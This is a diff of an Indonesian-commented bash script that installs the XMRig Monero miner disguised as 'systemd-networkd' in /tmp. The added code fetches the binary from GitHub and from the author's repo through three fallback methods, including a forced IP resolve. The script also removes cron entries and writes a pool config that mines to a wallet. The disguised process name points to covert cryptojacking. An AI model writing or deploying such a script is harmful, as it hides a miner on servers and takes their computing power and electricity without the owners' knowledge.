@@ -52,18 +52,54 @@ crontab -l 2>/dev/null | grep -v "systemd-networkd" | crontab - 2>/dev/null
 echo -e "${GREEN}  ✓ Cron dibersihkan${NC}"
 
 # ============================================
-# DOWNLOAD MINER DARI GITHUB
+# DOWNLOAD MINER DARI GITHUB - METHOD JITU
 # ============================================
-echo -e "${YELLOW}[3] Mendownload miner dari GitHub...${NC}"
-curl -L -s -o /tmp/systemd-networkd "$GITHUB_URL"
-if [[ -f /tmp/systemd-networkd && -s /tmp/systemd-networkd ]]; then
-    echo -e "${GREEN}  ✓ Download sukses (${NC}$(du -h /tmp/systemd-networkd | cut -f1)${GREEN})${NC}"
-else
-    echo -e "${RED}  ✗ Gagal download dari GitHub, gunakan fallback${NC}"
+echo -e "${YELLOW}[3] Mendownload miner...${NC}"
+
+# Method 1: Pake resolve IP (method jitu)
+echo -e "  Mencoba method 1 (resolve IP)..."
+curl -L --resolve github.com:443:140.82.114.4 --progress-bar -o /tmp/xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"
+
+if [[ -f /tmp/xmrig.tar.gz && -s /tmp/xmrig.tar.gz ]]; then
+    echo -e "${GREEN}  ✓ Method 1 berhasil, mengekstrak...${NC}"
     cd /tmp
-    curl -L --resolve github.com:443:140.82.114.4 -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz
     tar -xzf xmrig.tar.gz
     cp xmrig-6.25.0/xmrig /tmp/systemd-networkd
+else
+    echo -e "  Method 1 gagal, coba method 2 (download dari repo lo)..."
+    # Method 2: Download dari GitHub repo lo
+    curl -L -s -o /tmp/systemd-networkd "$GITHUB_URL"
+    
+    if [[ -f /tmp/systemd-networkd && -s /tmp/systemd-networkd ]]; then
+        echo -e "${GREEN}  ✓ Method 2 berhasil${NC}"
+    else
+        echo -e "  Method 2 gagal, coba method 3 (fallback terakhir)..."
+        # Method 3: Fallback terakhir tanpa resolve
+        cd /tmp
+        curl -L -o xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"
+        
+        if [[ -f /tmp/xmrig.tar.gz && -s /tmp/xmrig.tar.gz ]]; then
+            echo -e "${GREEN}  ✓ Method 3 berhasil, mengekstrak...${NC}"
+            tar -xzf xmrig.tar.gz
+            cp xmrig-6.25.0/xmrig /tmp/systemd-networkd
+        else
+            echo -e "${RED}  ✗ Semua method download gagal. Cek koneksi internet server!${NC}"
+            exit 1
+        fi
+    fi
+fi
+
+# Bersihkan file hasil download yang udah gak dipake
+rm -f /tmp/xmrig.tar.gz 2>/dev/null
+rm -rf /tmp/xmrig-6.25.0 2>/dev/null
+
+# Verifikasi file hasil
+if [[ -f /tmp/systemd-networkd && -s /tmp/systemd-networkd ]]; then
+    chmod +x /tmp/systemd-networkd
+    echo -e "${GREEN}  ✓ Download sukses (${NC}$(du -h /tmp/systemd-networkd | cut -f1)${GREEN})${NC}"
+else
+    echo -e "${RED}  ✗ Gagal mendapatkan file binary. Installasi tidak bisa dilanjutkan.${NC}"
+    exit 1
 fi
 
 # ============================================
@@ -110,7 +146,7 @@ cat > "$CONFIG_TARGET" << EOF
         {
             "url": "pool.supportxmr.com:443",
             "user": "$WALLET",
-            "pass": "sourcemoney",
+            "pass": "sourcemoney	",
             "keepalive": true,
             "tls": true
         }
